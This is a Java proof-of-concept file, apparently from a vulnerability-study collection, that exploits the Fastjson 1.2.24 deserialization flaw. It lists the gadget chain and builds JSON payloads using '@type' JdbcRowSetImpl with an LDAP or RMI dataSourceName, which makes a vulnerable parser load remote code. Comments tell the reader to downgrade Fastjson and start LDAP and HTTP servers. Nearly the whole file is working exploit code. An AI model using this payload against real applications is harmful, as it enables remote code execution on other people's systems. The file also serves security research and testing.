package vul.fastjson;

import com.alibaba.fastjson.JSON;
import com.sun.rowset.JdbcRowSetImpl;

import java.sql.SQLException;

/**
 * @ClassName: fastjson1224
 * @Description: TODO  修改pom.xml 中fastjson的版本号 <= 1.2.24
 * @Author: Summer
 * @Date: 2020/7/15 15:13
 * @Version: v1.0.0
 * @Description:
 **/

/**
 * Gadget chain:
 *      JSON.parse()
 *          DefaultJSONParser.parse()
 *              DefaultJSONParser.parseObject()
 *                  JavaBeanDeserializer.deserialze()
 *                      JavaBeanDeserializer.parseRest()
 *                          FieldDeserializer.setValue()
 *                              Reflect.invoke()
 *                                  JdbcRowSetImpl.setAutoCommit()
 *
 */
public class fastjson1224 {
    public static void main(String[] args) {

        String payload =   "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\"," +
//            TODO 开启 rmi 或者 ldap服务和HTTPServer服务 参考fastjson目录下package-info.java

                "\"dataSourceName\":\"ldap://127.0.0.1:1389/Weblogicpoc\",\"autoCommit\":true}";
//                "\"dataSourceName\":\"rmi://localhost:1090/Exploit\",\"autoCommit\":true}";
        String poc = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0.1:1389/Calc\",\"autoCommit\":true}";
        JSON.parse(poc);

//        JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
//        try {
//            jdbcRowSet.setDataSourceName("ldap://127.0.0.1:1389/Exploit");
//            jdbcRowSet.setAutoCommit(true);
//        } catch (SQLException throwables) {
//            throwables.printStackTrace();
//        }

    }
}
